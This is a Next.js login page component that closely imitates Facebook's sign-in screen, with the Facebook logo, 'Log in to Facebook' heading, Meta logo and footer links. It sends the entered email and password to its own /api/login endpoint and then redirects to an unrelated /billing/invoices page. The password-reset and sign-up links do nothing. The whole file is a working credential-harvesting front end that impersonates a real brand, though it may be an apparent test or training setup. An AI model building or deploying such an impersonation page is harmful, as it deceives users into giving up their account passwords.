"use client";

import { useState } from "react";
import { useRouter } from "next/navigation";
import styles from "./page.module.css";

export default function LoginPage() {
  const router = useRouter();
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);

  async function handleSubmit(e: React.FormEvent) {
    e.preventDefault();
    setError("");
    setLoading(true);
    try {
      const res = await fetch("/api/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email, password }),
      });
      if (res.ok) {
        router.push("/billing/invoices");
        router.refresh();
        return;
      }
      const data = await res.json().catch(() => ({}));
      setError(data.error || "Unable to log in. Please try again.");
    } catch {
      setError("Something went wrong. Please try again.");
    } finally {
      setLoading(false);
    }
  }

  return (
    <div className={styles.page}>
      <div className={styles.main}>
        {/* Left half — logo, collage, headline */}
        <div className={styles.left}>
          <svg
            className={styles.logo}
            viewBox="0 0 36 36"
            xmlns="http://www.w3.org/2000/svg"
            aria-label="Facebook"
          >
            <path
              fill="#0866FF"
              d="M18 0C8.06 0 0 8.06 0 18c0 8.98 6.58 16.42 15.19 17.78V23.2h-4.57v-5.2h4.57v-3.96c0-4.51 2.69-7 6.8-7 1.97 0 4.03.35 4.03.35v4.43h-2.27c-2.24 0-2.94 1.39-2.94 2.81V18h5l-.8 5.2h-4.2v12.58C29.42 34.42 36 26.98 36 18 36 8.06 27.94 0 18 0z"
            />
          </svg>

          <div className={styles.collageWrap}>
            {/* eslint-disable-next-line @next/next/no-img-element */}
            <img
              className={styles.collage}
              src="/login-collage.webp"
              alt=""
              draggable={false}
            />
          </div>

          <h1 className={styles.headline}>
            Explore the
            <br />
            things <span className={styles.hl}>you</span>
            <br />
            <span className={styles.hl}>love</span>.
          </h1>
        </div>

        {/* Right half — login card */}
        <div className={styles.right}>
          <div className={styles.card}>
            <div className={styles.cardHead}>
              <svg
                className={styles.back}
                viewBox="0 0 24 24"
                fill="none"
                aria-hidden="true"
              >
                <path
                  d="M15 5l-7 7 7 7"
                  stroke="currentColor"
                  strokeWidth="2.2"
                  strokeLinecap="round"
                  strokeLinejoin="round"
                />
              </svg>
              <div className={styles.cardTitle}>Log in to Facebook</div>
            </div>

            <form onSubmit={handleSubmit}>
              <input
                className={styles.field}
                type="text"
                placeholder="Email address or mobile number"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                autoComplete="username"
              />
              <input
                className={styles.field}
                type="password"
                placeholder="Password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                autoComplete="current-password"
              />

              <div className={styles.error}>{error}</div>

              <button
                className={styles.loginBtn}
                type="submit"
                disabled={loading}
              >
                {loading ? "Logging in…" : "Log in"}
              </button>
            </form>

            <a
              className={styles.forgot}
              href="#"
              onClick={(e) => e.preventDefault()}
            >
              Forgotten password?
            </a>

            <div className={styles.createWrap}>
              <button
                className={styles.createBtn}
                type="button"
                onClick={() => {}}
              >
                Create new account
              </button>
            </div>

            <div className={styles.metaWrap}>
              {/* eslint-disable-next-line @next/next/no-img-element */}
              <img
                className={styles.metaLogo}
                src="/meta-logo.svg"
                alt="Meta"
              />
            </div>
          </div>
        </div>
      </div>

      {/* Footer */}
      <footer className={styles.footer}>
        <div className={styles.langs}>
          <span className={styles.langCurrent}>English (UK)</span>
          <a className={styles.lang} href="#" onClick={(e) => e.preventDefault()}>
            हिन्दी
          </a>
          <a className={styles.lang} href="#" onClick={(e) => e.preventDefault()}>
            ਪੰਜਾਬੀ
          </a>
          <a className={styles.lang} href="#" onClick={(e) => e.preventDefault()}>
            اردو
          </a>
          <a className={styles.lang} href="#" onClick={(e) => e.preventDefault()}>
            ગુજરાતી
          </a>
          <a className={styles.lang} href="#" onClick={(e) => e.preventDefault()}>
            বাংলা
          </a>
          <a className={styles.lang} href="#" onClick={(e) => e.preventDefault()}>
            தமிழ்
          </a>
          <span className={styles.moreLangs}>More languages…</span>
        </div>
        <div className={styles.links}>
          {[
            "Sign up",
            "Log in",
            "Messenger",
            "Facebook Lite",
            "Video",
            "Meta Pay",
            "Meta Store",
            "Meta Quest",
            "Ray-Ban Meta",
            "Meta AI",
            "Instagram",
            "Threads",
            "Privacy Policy",
          ].map((label) => (
            <a key={label} href="#" onClick={(e) => e.preventDefault()}>
              {label}
            </a>
          ))}
        </div>
      </footer>
    </div>
  );
}
